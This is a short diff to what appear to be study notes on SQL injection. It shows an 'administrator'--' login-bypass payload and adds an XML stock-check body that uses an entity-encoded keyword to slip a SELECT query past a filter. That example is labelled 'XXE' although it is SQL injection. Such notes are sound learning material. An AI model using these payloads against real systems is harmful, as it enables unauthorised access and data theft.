@@ -17,3 +17,11 @@ In the login flow, we can use this payload to login like administrator
 ```
 administrator'--
 ```
+
+# SQL injection in different contexts (XXE)
+```
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+```
